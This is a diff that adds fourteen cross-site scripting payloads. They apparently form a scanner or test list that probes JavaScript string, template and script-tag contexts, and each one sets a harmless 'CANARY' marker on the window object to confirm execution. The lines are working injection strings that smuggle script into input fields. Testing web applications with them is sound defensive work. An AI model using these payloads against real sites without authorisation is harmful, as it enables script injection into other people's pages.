@@ -1,0 +1,14 @@
+    ';window._xss_confirmed='CANARY'//
+    ";window._xss_confirmed='CANARY'//
+    `;window._xss_confirmed='CANARY'//
+    \';window._xss_confirmed='CANARY'//
+    \";window._xss_confirmed='CANARY'//
+    </script><script>window._xss_confirmed='CANARY'</script>
+    </script><img src=x onerror=window._xss_confirmed='CANARY'>
+    '-window._xss_confirmed='CANARY'-'
+    "-window._xss_confirmed='CANARY'-"
+    ;window._xss_confirmed='CANARY';
+    }};window._xss_confirmed='CANARY';//
+    ]);window._xss_confirmed='CANARY';//
+    +window._xss_confirmed='CANARY'+
+    ${window._xss_confirmed='CANARY'}
